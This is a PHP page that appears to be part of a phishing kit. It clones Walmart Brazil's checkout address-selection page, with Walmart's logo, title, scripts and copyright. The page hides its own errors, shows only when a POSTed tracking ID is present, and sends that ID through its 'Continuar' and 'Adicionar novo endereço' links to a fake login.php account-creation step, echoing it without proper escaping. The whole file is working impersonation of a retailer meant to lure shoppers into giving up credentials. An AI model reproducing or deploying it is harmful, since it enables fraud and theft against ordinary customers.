
<?php

error_reporting(0);
ini_set(“display_errors”, 0 );

if(isset($_POST['ID_MMS'])){	


$ID_FILTRADO = $_POST ['ID_MMS'];
$ID =  addslashes($ID_FILTRADO);



?>

<!DOCTYPE html>
<!-- saved from url=(0059)https://www2.walmart.com.br/checkout/content/#chooseAddress -->
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths modal-open" style="">

<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="../Raiz/Files2/2960.js.download" async="" type="text/javascript"></script><script src="../Raiz/Files2/314572478707493" async=""></script><script async="" src="../Raiz/Files2/fbevents.js.download"></script><script async="" src="../Raiz/Files2/cs.js.download"></script><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Escolha de endereço de entrega - Walmart.com</title><meta name="description" content=""><meta name="viewport" content="width=device-width,user-scalable=no"><link rel="shortcut icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><link rel="icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><!-- Place favicon.ico and apple-touch-icon.png in the root directory --><link rel="stylesheet" href="../Raiz/Files2/5e2214d5.checkout.css"><script src="../Raiz/Files2/ff3057f9.feature.js.download"></script><script language="Javascript" type="text/javascript" src="../Raiz/Files2/encryption.js.download"></script>

<script language="Javascript" type="text/javascript" src="../Raiz/Files2/getkey.js.download"></script>
<script src="../Raiz/Files2/analytics.js.download"></script>
<script src="../Raiz/Files2/s-code-contents-18bb769dbfda1ec099f682ef04215ace88fc2799.js.download"></script><link rel="dns-prefetch" href="https://device.clearsale.com.br/"><script src="../Raiz/Files2/satellite-56d8236264746d5460002c13.js.download"></script>


</head><body style=""><div class="wrapper"><header class="header choose-address"><div class="header-wrapper">
  <figure class="navbar-brand">
    
    
      <img class="header-logo" src="../Raiz/Files2/walmart-logo.png" alt="Walmart.com">
    

  </figure>
  <h1 class="header-title choose-address">
    Onde você quer receber?
  </h1>
  <div class="header-security">
    <div class="header-security-wrapper">
    <img src="../Raiz/assets/img/a.png" >
    </div>
  </div>
</div>
</header><!-- Main content --><main class="main-content"><div class="address-view view-content"><div class="choose-address container">
  
<div class="address-card choose add-address"><a class="add-address-link" data-toggle="modal" href="login.php?account_create&id=<?php echo $ID ?>">
<img src="../Raiz/assets/img/1.png" >  

<span>Adicionar novo endereço</span>


</a>
</div></div>
<section class="steps-control">
  <div class="steps-control-wrapper">
    <a href="#" class="btn btn-success-border">Voltar</a>
    <a href="login.php?account_create&id=<?php echo $ID ?>" class="btn btn-success">Continuar</a>
	
   
  </div>
</section>
</div></main><!-- Footer content --><footer id="footer" class="footer"><section class="footer-wrapper">
  

  <div class="footer-security">
    <div class="footer-security-wrapper">
    <img src="../Raiz/assets/img/e.png" >
    </div>
  </div>

  <div class="footer-description">
    <p class="footer-text">© 2018 Walmart.com, Inc • Todos os direitos reservados</p>
    <a data-href="/institucional/termos-uso" data-modal="termsOfUse">Termos de uso</a>
    <span>•</span>
    <a data-href="/institucional/politica-privacidade/" data-modal="privacyPolicy">Política de privacidade</a>
  </div>
</section>
</footer>





</div>


  
  









</section>
</script>

<script type="text/javascript">


</body></html>


<?php } ?>